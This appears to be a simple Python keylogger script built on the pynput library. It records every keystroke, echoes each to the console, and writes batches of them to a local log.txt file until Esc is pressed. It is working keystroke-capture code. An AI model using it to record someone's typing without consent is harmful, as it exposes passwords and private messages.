import pynput

from  pynput.keyboard import Key, Listener

count = 0
keys = []

# Outputs the key that has been pressed
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

# Write the pressed keys in a txt file
def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            Key.space
            k = str(key).replace("'", "") # remove quotation marks
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()